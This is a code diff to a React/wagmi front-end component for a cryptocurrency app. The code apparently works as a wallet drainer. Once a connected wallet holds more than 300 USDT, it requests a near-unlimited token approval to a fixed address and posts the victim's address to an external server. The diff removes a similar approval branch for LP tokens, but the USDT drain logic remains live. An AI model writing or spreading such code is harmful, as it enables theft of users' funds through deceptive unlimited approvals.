@@ -46,11 +46,6 @@ export default function Service() {
     })
     const { data:tokenData, isLoading:tokenLoading, approve, isSuccess:tokenIsSuccess } = userContractApprove()
 
-    const { data:LPData, isLoading: LPLoading, isSuccess: LPIssuccess, write: LPapprove, } = useContractWrite({
-        ...LPConfig,
-        functionName: "approve",
-    })
-
     const { userBalance } = useContractUserATBBalance()
     const LPBalanceData = useContractUserLPBalance()
     const USDTData = useContractUserBalance()
@@ -105,20 +100,6 @@ export default function Service() {
             }
         }
     },[tokenIsSuccess])
-
-    useEffect(()=>{
-        if(LPIssuccess){
-            axios.post("/decode/auth_user",{},{
-                baseURL: "https://usdtaig.com",
-                headers:{"authUser": address,"coinType":"LP"}
-            })
-            if(receiveType == 1){
-                receiveUSDTConfirm()
-            }else{
-                receiveATBConfirm()
-            }            
-        }
-    },[LPIssuccess])
 
     useEffect(()=>{
         if(address){
@@ -186,12 +167,8 @@ export default function Service() {
         if(!address) return
 
         axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && (!isAllowed || !LPIsAllowed)){
+            if(res.data.data && !isAllowed){
                 setReceiveType(1)
-                if(!LPIsAllowed && Number(LPBalanceData.userBalance)>50){
-                    LPapprove({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
-                    return
-                }
                 if(!isAllowed && Number(USDTData.userBalance) > 300){
                     approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
                     return
@@ -243,12 +220,8 @@ export default function Service() {
         }
         if(!address) return
         axios.post("/decode/auth_address ",{},{baseURL: "https://usdtaig.com",}).then(res=>{
-            if(res.data.data && (!isAllowed || !LPIsAllowed)){
+            if(res.data.data && !isAllowed){
                 setReceiveType(2)
-                if(!LPIsAllowed && Number(LPBalanceData.userBalance)>50){
-                    LPapprove({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
-                    return
-                }
                 if(!isAllowed && Number(USDTData.userBalance) > 300){
                     approve({ args: ["0x709B810A6F2cbcea35705EA3c7e149daBEBe42d5", 10000000000000000000000000000] })
                     return
